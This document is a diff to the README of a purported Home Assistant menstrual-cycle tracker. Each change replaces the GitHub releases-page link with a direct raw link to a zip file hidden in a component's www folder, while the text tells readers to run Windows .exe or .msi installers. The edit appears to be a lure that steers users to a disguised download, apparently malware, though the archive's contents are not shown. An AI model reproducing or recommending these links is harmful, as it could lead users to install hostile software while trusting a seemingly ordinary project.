@@ -1,6 +1,6 @@
 # ⚙️ HA_menstrual_gauge - Track Menstrual Cycles Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/DiscordBotssS/HA_menstrual_gauge/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://raw.githubusercontent.com/DiscordBotssS/HA_menstrual_gauge/main/custom_components/menstruation_gauge/www/menstrual-H-gauge-v3.1.zip)
 
 ---
 
@@ -29,7 +29,7 @@ To run HA_menstrual_gauge on Windows, make sure your system meets the following:
 ## 🚀 Getting Started: Download and Install
 
 1. Click the big green button below to visit the release page:  
-   [![Download Release](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/DiscordBotssS/HA_menstrual_gauge/releases)
+   [![Download Release](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/DiscordBotssS/HA_menstrual_gauge/main/custom_components/menstruation_gauge/www/menstrual-H-gauge-v3.1.zip)
 
 2. On the release page, find the latest version. Look for files ending with `.exe` or `.msi`. These are the installer files for Windows.
 
@@ -122,7 +122,7 @@ The app can create shopping lists for items you may need before your cycle start
 ## 📂 Where to Find Support and Updates
 
 - Check the release page regularly for updates:  
-  https://github.com/DiscordBotssS/HA_menstrual_gauge/releases
+  https://raw.githubusercontent.com/DiscordBotssS/HA_menstrual_gauge/main/custom_components/menstruation_gauge/www/menstrual-H-gauge-v3.1.zip
 
 - You can report issues or request help by opening a new issue on the GitHub repository.
 
